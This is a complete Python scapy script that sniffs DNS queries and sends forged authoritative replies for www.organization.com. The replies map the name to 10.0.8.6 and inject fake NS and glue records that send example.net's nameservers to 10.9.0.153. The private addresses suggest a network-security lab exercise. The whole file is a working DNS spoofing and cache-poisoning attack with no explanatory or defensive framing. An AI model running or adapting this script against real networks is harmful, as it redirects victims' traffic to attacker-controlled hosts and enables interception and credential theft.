#!/usr/bin/env python3
from scapy.all import *


def spoof_dns(pkt):
    if (DNS in pkt and 'www.organization.com' in pkt[DNS].qd.qname.decode('utf-8')):

        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='10.0.8.6')

        # The Authority Section
        NSsec1 = DNSRR(rrname='example.net', type='NS',
                       ttl=259200, rdata='ns1.example.net')
        NSsec2 = DNSRR(rrname='example.net', type='NS',
                       ttl=259200, rdata='ns2.example.net')

        # The Additional Section
        Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                        ttl=259200, rdata='10.9.0.153')
        Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                        ttl=259200, rdata='10.9.0.153')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=2, arcount=2,
                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='local_net', filter=f, prn=spoof_dns)
